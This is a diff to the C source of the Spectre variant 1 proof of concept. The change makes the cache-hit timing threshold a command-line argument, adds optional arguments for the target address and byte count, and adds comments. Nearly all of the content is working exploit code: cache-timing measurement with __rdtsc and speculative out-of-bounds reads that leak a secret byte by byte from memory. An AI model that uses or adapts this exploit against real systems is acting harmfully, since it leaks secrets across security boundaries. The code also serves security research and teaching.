@@ -61,12 +61,8 @@ void victim_function(size_t x) {
 Analysis code
 ********************************************************************/
 
-/* Assume cache hit if time <= threshold */
-/* This can be tweaked for different processors. Values as high as 500 may be needed for certain CPUs */
-#define CACHE_HIT_THRESHOLD (80)
-
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
+void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
   size_t training_x, x;
@@ -111,7 +107,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #endif
-      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
@@ -135,29 +131,71 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   score[1] = results[k];
 }
 
+/*
+*  Command line arguments:
+*  1: Cache hit threshold (int)
+*  2: Malicious address start (size_t)
+*  3: Malicious address count (int)
+*/
 int main(int argc,
   const char * * argv) {
-  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
-  int i, score[2], len = 40;
-  uint8_t value[2];
+  
+  /* Default to a cache hit threshold of 80 */
+  int cache_hit_threshold = 80;
 
-  for (i = 0; i < sizeof(array2); i++)
+  /* Default for malicious_x is the secret string address */
+  size_t malicious_x = (size_t)(secret - (char * ) array1);
+  
+  /* Default addresses to read is 40 (which is the length of the secret string) */
+  int len = 40;
+  
+  int score[2];
+  uint8_t value[2];
+  int i;
+
+  for (i = 0; i < sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-  if (argc == 3) {
-    sscanf(argv[1], "%p", (void * * )( & malicious_x));
-    malicious_x -= (size_t) array1; /* Convert input value into a pointer */
-    sscanf(argv[2], "%d", & len);
   }
 
+  /* Parse the cache_hit_threshold from the first command line argument.
+     (OPTIONAL) */
+  if (argc >= 2) {
+    sscanf(argv[1], "%d", &cache_hit_threshold);
+  }
+
+  /* Parse the malicious x address and length from the second and third
+     command line argument. (OPTIONAL) */
+  if (argc >= 4) {
+    sscanf(argv[2], "%p", (void * * )( &malicious_x));
+
+    /* Convert input value into a pointer */
+    malicious_x -= (size_t) array1;
+
+    sscanf(argv[3], "%d", &len);
+  }
+  
+  printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
   printf("Reading %d bytes:\n", len);
+
+  /* Start the read loop to read each address */
   while (--len >= 0) {
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
-    readMemoryByte(malicious_x++, value, score);
+
+    /* Call readMemoryByte with the required cache hit threshold and
+       malicious x address. value and score are arrays that are
+       populated with the results.
+    */
+    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
+
+    /* Display the results */
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    if (score[1] > 0)
+    
+    if (score[1] > 0) {
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+    }
+
     printf("\n");
   }
   return (0);
